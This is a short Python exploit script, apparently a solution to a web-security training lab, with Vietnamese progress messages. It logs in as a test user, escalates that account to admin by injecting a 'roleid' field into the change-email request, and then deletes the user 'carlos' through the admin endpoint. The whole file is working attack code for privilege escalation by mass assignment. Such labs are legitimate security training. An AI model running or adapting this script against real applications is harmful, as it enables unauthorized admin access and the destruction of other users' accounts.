import requests
import re

target_url="YOUR_URL"
headers={
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br"
}

session=requests.Session()
session.headers.update(headers)

path_login="/login"
path_exploit="/my-account/change-email"

print("=== Tien hanh dang nhap ===")
res_login=session.post(target_url+path_login,data={
    "username":"wiener",
    "password":"peter"
},allow_redirects=True)

print(res_login.status_code)
print(res_login.text)

print("=== Tien hanh leo quyen admin ===")
res_exploit=session.post(target_url+path_exploit,data={
    "email":"[EMAIL_ADDRESS]",
    "roleid":2
},allow_redirects=True)

print(res_exploit.status_code)
print(res_exploit.text)

print("=== Tien hanh xoa user ===")
res_del=session.get(target_url+"/admin/delete?username=carlos",allow_redirects=True)

print(res_del.status_code)
print(res_del.text)

if("User deleted successfully!" in res_del.text):
    print("Xoa nguoi dung thanh cong")
else:
    print("Xoa nguoi dung that bai")